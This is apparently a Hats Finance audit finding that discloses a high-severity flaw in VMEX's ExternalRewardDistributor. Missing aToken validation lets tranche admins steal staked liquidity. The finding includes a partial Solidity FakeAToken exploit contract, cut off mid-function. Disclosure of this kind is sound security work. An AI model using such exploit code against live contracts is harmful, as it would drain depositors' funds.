# [H] Verified tranche admins can steal staked liquidity from all tranches

## Summary
Severity: High
Chain: Smart contract
Component: VMEX
Published: 2023-07-29
Source: https://github.com/hats-finance/VMEX-0xb6861bdeb368a1bf628fc36a36cec62d04fb6a77/issues/8
Type: hats-finding

## Details
**Github username:** @bahurum
**Submission hash (on-chain):** 0x8b57387e4a679ea296efd0c3abce065aea75a4ecf64a32d424a66bb6b3ea2edf
**Severity:** high severity

**Description:**
## Description
In `ExternalRewardDistributor.removeStakingReward()` and `ExternalRewardDistributor.beginStakingReward()` there is no check that the `aToken` passed as an argument is valid. This allows any verified tranche admin to pass a fake `aToken` and steal staked liquidity from any tranche.

## Attack scenario
The vulnerability is somewhat similiar to one reported in the previous audit competition. See [here](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/issues/14).

Consider the following fake aToken contract.

```solidity
contract FakeAToken {

    address public UNDERLYING_ASSET_ADDRESS; // staked underlying token to be stolen
    uint64 public _tranche; // tranche of which the attacker is a verified admin
    uint256 stakedAmount; // amount of underlying staked and to be stolen
    uint i; // counter

    constructor(address _underlying, uint64 _trancheId, uint256 _stakedAmount) {
        // attacker sets underlying and tranche of the aToken impersonated
        UNDERLYING_ASSET_ADDRESS = _underlying;
        _tranche = _trancheId;
        stakedAmount = _stakedAmount;
    }

    function totalSupply() external returns (uint) {
        if (i == 0) {  // do this so that the first time `totalSupply()` is 0
            i++;
            return 0;
        }
        return stakedAmount;
    }

    function send() external {
        uint balance = IERC20(UNDERLYING_ASSET_ADDRESS).balanceOf(address(this));
```

_Trimmed to 38 lines — full report: https://github.com/hats-finance/VMEX-0xb6861bdeb368a1bf628fc36a36cec62d04fb6a77/issues/8_
